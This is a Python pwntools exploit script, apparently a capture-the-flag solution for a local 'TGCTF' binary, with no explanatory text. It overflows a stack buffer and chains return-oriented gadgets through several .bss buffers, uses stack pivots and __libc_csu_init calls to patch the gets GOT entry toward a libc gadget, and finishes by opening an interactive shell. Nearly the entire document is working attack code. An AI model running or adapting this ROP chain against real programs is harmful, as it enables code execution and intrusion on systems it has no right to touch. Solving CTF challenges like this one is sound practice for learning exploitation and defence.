from pwn import *

# context.terminal = ["tmux", "split", "-h"]
context(log_level="debug", arch="amd64", os="linux")
io = process(["./pwn"], env={"LD_PRELOAD": "./TGCTF.so"})
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def dbg():
    gdb.attach(io)


gets_plt = elf.plt["gets"]
gets_got = elf.got["gets"]
csu = elf.symbols["__libc_csu_init"]
bss = 0x602000
buf1 = bss - 0x100
buf2 = bss - 0x200
buf3 = bss - 0x300
buf4 = bss - 0x400
buf5 = bss - 0x500
buf6 = bss - 0x600
buf7 = bss - 0x700
buf8 = bss - 0x800
rdi = next(elf.search(asm("pop rdi; ret;"), executable=True))
leave = next(elf.search(asm("leave; ret;"), executable=True))
rbp = next(elf.search(asm("pop rbp; ret;"), executable=True))
pop_rsp_r13_r14_r15_ret = next(
    elf.search(asm("pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret"), executable=True)
)
pop_rbx_rbp_r12_r13_r14_r15_ret = next(
    elf.search(
        asm("pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"),
        executable=True,
    )
)
call_r12 = next(elf.search(asm("call QWORD PTR [r12+rbx*8];"), executable=True))
pop_rsi_r15_ret = next(elf.search(asm("pop rsi ; pop r15 ; ret;"), executable=True))
add_ebx_esi_ret = next(elf.search(asm("add ebx, esi ; ret;"), executable=True))
gets_offset = libc.symbols["gets"]
offset = 0x1C1AE0 + 0x1139
if offset < 0:
    offset &= 0xFFFFFFFF
payload = b"a" * (0x10 + 8)
payload += p64(rdi) + p64(buf1) + p64(gets_plt)
payload += p64(rdi) + p64(buf2) + p64(gets_plt)
payload += p64(rdi) + p64(buf3) + p64(gets_plt)
payload += p64(rdi) + p64(buf4) + p64(gets_plt)
payload += p64(rdi) + p64(buf5) + p64(gets_plt)
payload += p64(rdi) + p64(buf6) + p64(gets_plt)
payload += p64(rdi) + p64(buf7) + p64(gets_plt)
payload += p64(rdi) + p64(buf1 - 8) + p64(leave)
io.sendline(payload)

# buf1
payload = p64(rdi) + p64(gets_got + 24) + p64(gets_plt)
payload += p64(rbp) + p64(buf2 - 8)
payload += p64(pop_rsp_r13_r14_r15_ret) + p64(gets_got)
io.sendline(payload)

# buf2
payload = p64(csu) + p64(rbp) + p64(buf3 - 8) + p64(leave)
io.sendline(payload)

# buf3
payload = p64(rdi) + p64(buf2 - 24) + p64(gets_plt)
payload += p64(rdi) + p64(buf2 + 32) + p64(gets_plt)
payload += p64(rbp) + p64(buf2 - 24 - 8) + p64(leave)
io.sendline(payload)

# buf4
payload = p64(rdi) + p64(gets_got + 28) + p64(gets_plt)
payload += p64(rbp) + p64(buf5 - 8)
payload += p64(pop_rsp_r13_r14_r15_ret) + p64(gets_got + 4)
io.sendline(payload)

# buf5
payload = p64(csu) + p64(rbp) + p64(buf6 - 8) + p64(leave)
io.sendline(payload)

# buf7
payload = p64(rdi) + p64(buf5 - 24) + p64(gets_plt)
payload += p64(rdi) + p64(buf5 + 32) + p64(gets_plt)
payload += p64(rbp) + p64(buf5 - 24 - 8) + p64(leave)
io.sendline(payload)

# dbg()
# shell
payload = p64(rdi) + p64(buf8) + p64(gets_plt)
payload += p64(rdi) + p64(buf8) + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
payload += p64(0) + p64(0) + p64(buf2 + 24) + p64(0) + p64(0) + p64(0)
payload += p64(call_r12)
io.sendline(payload)

io.sendline(p64(leave)[:-1])

io.sendline(p64(pop_rbx_rbp_r12_r13_r14_r15_ret)[:-1])

payload = p64(pop_rsi_r15_ret) + p64(offset) + p64(8)
payload += p64(add_ebx_esi_ret) + p64(csu) + p64(rbp)
payload += p64(buf4 - 8) + p64(leave)
io.sendline(payload)

io.sendline(p64(leave))

payload = p64(pop_rbx_rbp_r12_r13_r14_r15_ret)[:-1]
io.sendline(payload)

payload = p64(rdi) + p64(buf2 + 68) + p64(gets_plt)
payload += p64(rbp) + p64(buf2 + 68 - 8) + p64(leave)
io.sendline(payload)

payload = p64(csu) + p64(rbp) + p64(buf7) + p64(leave)
#dbg()
io.sendline(payload)
io.sendline(b"TGCTF")
io.interactive()
